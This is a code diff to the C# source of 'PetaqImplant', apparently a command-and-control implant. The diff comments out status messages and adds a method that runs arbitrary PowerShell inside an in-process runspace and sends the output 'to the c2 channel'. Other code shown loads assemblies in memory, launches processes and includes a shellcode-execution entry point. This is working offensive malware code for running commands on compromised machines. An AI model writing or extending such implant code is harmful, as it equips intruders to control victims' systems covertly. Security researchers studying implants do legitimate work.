@@ -14,7 +14,10 @@ using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Threading;
 using System.Threading.Tasks;
-
+using System.Management;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Management.Automation.Host;
 
 namespace PetaqImplant
 {
@@ -205,7 +208,7 @@ namespace PetaqImplant
                        
             if (wait)
             {
-                Console.WriteLine("I wait for the assembly to finish...");
+                //Console.WriteLine("I wait for the assembly to finish...");
                 if (arguments == null || arguments.Length == 0)
                 {
                     method.Invoke(o, null);
@@ -219,10 +222,10 @@ namespace PetaqImplant
             }
             else
             {
-                Console.WriteLine("I don't wait for the assembly to finish...");
+                //Console.WriteLine("I don't wait for the assembly to finish...");
                 // start as a thread if not waiting
                 ThreadStart ths;
-                if (arguments == null || arguments.Length == 0)
+                if (arguments.Length == 0)
                 {
                     ths = new ThreadStart(() => method.Invoke(o, null));
                 }
@@ -238,7 +241,7 @@ namespace PetaqImplant
 
             return;
         }
-        public static void ExecSharpCode(string sharpcode, object[] arguments = null, bool wait = true)
+        public static void ExecSharpCode(string sharpcode, string[] arguments , bool wait = true)
         {
             // Not available in .NET Core
             //Console.WriteLine("Not available in .NET Core version");
@@ -268,8 +271,8 @@ namespace PetaqImplant
 
             if (wait)
             {
-                Console.WriteLine("I wait for the assembly to finish...");
-                if (arguments == null || arguments.Length == 0)
+                //Console.WriteLine("I wait for the assembly to finish...");
+                if (arguments.Length == 0)
                 {
                     method.Invoke(o, null);
                 }
@@ -282,7 +285,7 @@ namespace PetaqImplant
             }
             else
             {
-                Console.WriteLine("I don't wait for the assembly to finish...");
+                //Console.WriteLine("I don't wait for the assembly to finish...");
                 // start as a thread if not waiting
                 ThreadStart ths;
                 if (arguments == null || arguments.Length == 0)
@@ -325,7 +328,7 @@ namespace PetaqImplant
                 
                 if (wait)
                 {
-                    Console.WriteLine("Waiting for the process to complete...");
+                    //Console.WriteLine("Waiting for the process to complete...");
                     process.Start();
                     output = process.StandardOutput.ReadToEnd();
                     string err = process.StandardError.ReadToEnd();
@@ -335,7 +338,7 @@ namespace PetaqImplant
                 }
                 else
                 {
-                    Console.WriteLine("The process started as a thread.");
+                    //Console.WriteLine("The process started as a thread.");
                     // start as a thread if not waiting
                     ThreadStart ths = new ThreadStart(() => process.Start());
                     Thread th = new Thread(ths);
@@ -351,7 +354,36 @@ namespace PetaqImplant
             }
         }
 
-        
+        public static void ExecPowershellAutomation(string pscontent, string[] arguments, bool wait = true)
+        {
+            // create Runspace and Pipeline
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+            Pipeline pipeline = runspace.CreatePipeline();
+
+            // include the powershell script given
+            pipeline.Commands.AddScript(pscontent);
+
+            // add additional commands if given
+            pipeline.Commands.AddScript(String.Join(" ",arguments));
+
+
+            // invoke the pipeline and collect the output
+            System.Collections.ObjectModel.Collection<PSObject> output = pipeline.Invoke();
+            runspace.Close();
+
+            // convert the output to strings
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in output)
+            {
+                stringBuilder.AppendLine(obj.ToString());
+            }
+
+            // send it to the c2 channel
+            Console.WriteLine(stringBuilder.ToString());
+        }
+
+
         public static void ExecShellcode(byte[] shellcode, string arch)
         {
 
